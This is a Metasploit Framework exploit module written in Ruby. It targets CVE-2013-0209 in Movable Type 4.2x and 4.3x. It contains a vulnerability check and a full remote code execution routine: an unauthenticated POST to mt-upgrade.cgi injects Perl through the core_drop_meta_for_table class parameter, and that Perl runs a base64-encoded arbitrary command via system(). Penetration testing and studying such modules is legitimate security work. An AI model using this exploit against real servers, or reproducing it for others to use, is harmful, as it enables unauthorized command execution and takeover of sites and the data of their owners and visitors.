##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote

	include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution',
			'Description'    => %q{
					This module can be used to execute a payload on MoveableType (MT) that
					exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),
					that is used during installation and updating of the platform.
					The vulnerability arises due to the following properties:
					1. This script may be invoked remotely without requiring authentication
					to any MT instance.
					2. Through a crafted POST request, it is possible to invoke particular
					database migration functions (i.e functions that bring the existing
					database up-to-date with an updated codebase) by name and with
					particular parameters.
					3. A particular migration function, core_drop_meta_for_table, allows
					a class parameter to be set which is used directly in a perl eval
					statement, allowing perl code injection.
			},
			'Author'         =>
				[
					'Kacper Nowak',
					'Nick Blundell',
					'Gary O\'Leary-Steele'
				],
			'References'     =>
				[
					['CVE', '2012-6315'], # superseded by CVE-2013-0209 (duplicate)
					['CVE', '2013-0209'],
					['URL', 'http://www.sec-1.com/blog/?p=402'],
					['URL', 'http://www.movabletype.org/2013/01/movable_type_438_patch.html']
				],
			'Arch'		 => ARCH_CMD,
			'Payload'	 =>
				{
					'Compat' =>
						{
							'PayloadType' => 'cmd'
						}
				},
			'Platform'	 =>
				[
					'win',
					'unix'
				],
			'Targets'	 =>
				[
					['Movable Type 4.2x, 4.3x', {}]
				],
			'Privileged'	 => false,
			'DisclosureDate' => "Jan 07 2013",
			'DefaultTarget'	 => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The URI path of the Movable Type installation', '/mt'])
			], self.class)
	end

	def check
		@peer = "#{rhost}:#{rport}"
		fingerprint = rand_text_alpha(5)
		print_status("#{@peer} - Sending check...")
		begin
			res = http_send_raw(fingerprint)
		rescue Rex::ConnectionError
			return Exploit::CheckCode::Unknown
		end
		if (res)
			if (res.code == 200 and res.body =~ /Can't locate object method \\"dbi_driver\\" via package \\"#{fingerprint}\\" at/)
				return Exploit::CheckCode::Vulnerable
			elsif (res.code != 200)
				return Exploit::CheckCode::Unknown
			else
				return Exploit::CheckCode::Safe
			end
		else
			return Exploit::CheckCode::Unknown
		end
	end

	def exploit
		@peer = "#{rhost}:#{rport}"
		print_status("#{@peer} - Sending payload...")
		http_send_cmd(payload.encoded)
	end

	def http_send_raw(cmd)
		path = normalize_uri(target_uri.path) + '/mt-upgrade.cgi'
		pay = cmd.gsub('\\', '\\\\').gsub('"', '\"')
		send_request_cgi(
			{
				'uri'       => path,
				'method'    => 'POST',
				'vars_post' =>
					{
						'__mode'     => 'run_actions',
						'installing' => '1',
						'steps'      => %{[["core_drop_meta_for_table","class","#{pay}"]]}
					}
			})
	end

	def http_send_cmd(cmd)
		pay = 'v0;use MIME::Base64;system(decode_base64(q('
		pay << Rex::Text.encode_base64(cmd)
		pay << ')));return 0'
		http_send_raw(pay)
	end
end

